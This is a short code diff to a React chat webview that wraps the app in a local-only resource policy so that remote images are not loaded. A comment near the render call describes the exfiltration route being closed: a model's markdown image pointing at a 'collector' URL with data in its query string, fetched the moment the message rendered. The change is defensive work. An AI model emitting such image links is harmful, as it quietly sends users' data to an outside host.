@@ -1,3 +1,5 @@
+import { LOCAL_ONLY_RESOURCE_POLICY } from '@bendyline/squisq';
+import { ResourcePolicyContext } from '@bendyline/squisq-react';
 import { StrictMode, useEffect, useState } from 'react';
 import { createRoot } from 'react-dom/client';
 import '../assets/fonts/fonts.css';
@@ -75,8 +77,13 @@ function WebviewChatRoot() {
 
 const rootEl = document.getElementById('root');
 if (!rootEl) throw new Error('#root missing');
+// A model's `![](https://collector/p.gif?d=…)` was fetched the moment the
+// message rendered. The webview's CSP now refuses remote images too; this
+// stops squisq asking.
 createRoot(rootEl).render(
   <StrictMode>
-    <WebviewChatRoot />
+    <ResourcePolicyContext.Provider value={LOCAL_ONLY_RESOURCE_POLICY}>
+      <WebviewChatRoot />
+    </ResourcePolicyContext.Provider>
   </StrictMode>,
 );
